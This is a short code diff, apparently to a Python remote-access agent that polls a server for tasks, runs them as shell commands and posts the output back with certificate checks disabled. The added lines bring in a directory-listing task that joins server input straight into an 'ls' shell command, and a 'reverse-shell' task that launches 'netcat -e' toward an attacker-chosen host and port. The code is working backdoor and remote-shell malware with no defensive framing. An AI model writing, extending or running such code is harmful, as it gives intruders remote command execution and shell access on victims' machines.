@@ -23,9 +23,13 @@ while True:
             }
             if task["type"] == "rce":
                 data["output"] = sp.getoutput(task["args"][0])
-            
+            elif task["type"] == "dir":
+                data["output"] = sp.getoutput("ls" + task["args"][0])
+            elif task["type"] == "reverse-shell":
+                data = sp.getoutput(f"netcat -e {task['args'][2]} {task['args'][0]} {task['args'][1]}")
             res = r.post(URL + "/finish/" + name, json=data, verify=False)
             print(res.status_code)
+
             
 
         
